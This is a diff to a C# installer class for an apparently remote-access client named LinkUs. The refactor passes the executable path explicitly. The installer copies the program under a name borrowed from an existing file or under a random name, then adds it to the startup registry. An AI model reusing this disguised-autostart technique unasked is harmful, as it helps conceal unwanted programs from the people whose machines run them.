@@ -1,7 +1,5 @@
 using System;
-using System.Diagnostics;
 using System.IO;
-using System.Reflection;
 
 namespace LinkUs.Client.Install
 {
@@ -23,53 +21,53 @@ namespace LinkUs.Client.Install
         }
 
         // ----- Public methods
-        public string Install()
+        public string Install(string exeFile)
         {
             var currentInstalledApplicationPath = _registry.GetFileLocation();
             if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
-                return ProcessInstall();
+                return ProcessInstall(exeFile);
             }
-            else if (string.Equals(currentInstalledApplicationPath, _environment.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
-                CheckInstall();
+
+            if (string.Equals(currentInstalledApplicationPath, exeFile, StringComparison.InvariantCultureIgnoreCase)) {
+                CheckInstall(exeFile);
                 return currentInstalledApplicationPath;
             }
-            else {
-                var installedVersion = _fileService.GetAssemblyVersion(currentInstalledApplicationPath);
-                if (installedVersion >= _environment.CurrentVersion) {
-                    throw new HigherVersionAlreadyInstalled(currentInstalledApplicationPath);
-                }
-                else {
-                    return ProcessInstall();
-                }
+
+            var installedVersion = _fileService.GetAssemblyVersion(currentInstalledApplicationPath);
+            var targetVersion = _fileService.GetAssemblyVersion(exeFile);
+            if (installedVersion >= targetVersion) {
+                throw new HigherVersionAlreadyInstalled(currentInstalledApplicationPath);
             }
+
+            return ProcessInstall(exeFile);
         }
-        public void Uninstall()
+        public void Uninstall(string exeFile)
         {
-            _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
+            _registry.RemoveFileFromStartupRegistry(exeFile);
             _registry.ClearFileLocation();
         }
-        public bool WellLocated()
+        public bool IsInstalled(string exeFile)
         {
-            var parentDirectory = Path.GetDirectoryName(_environment.ApplicationPath);
+            var parentDirectory = Path.GetDirectoryName(exeFile);
             return string.Equals(GetInstallationDirectory(), parentDirectory, StringComparison.CurrentCultureIgnoreCase);
         }
-        public void CheckInstall()
+        public void CheckInstall(string exeFile)
         {
-            if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
-                _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
+            if (_registry.IsRegisteredAtStartup(exeFile) == false) {
+                _registry.AddFileToStartupRegistry(exeFile);
             }
-            if (_registry.GetFileLocation() != _environment.ApplicationPath) {
-                _registry.SetFileLocation(_environment.ApplicationPath);
+            if (_registry.GetFileLocation() != exeFile) {
+                _registry.SetFileLocation(exeFile);
             }
         }
 
         // ----- Internal logic
-        private string ProcessInstall()
+        private string ProcessInstall(string exeFile)
         {
             var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
             var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);
 
-            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
+            _fileService.Copy(exeFile, targetFilePath);
             _registry.AddFileToStartupRegistry(targetFilePath);
             _registry.SetFileLocation(targetFilePath);
 
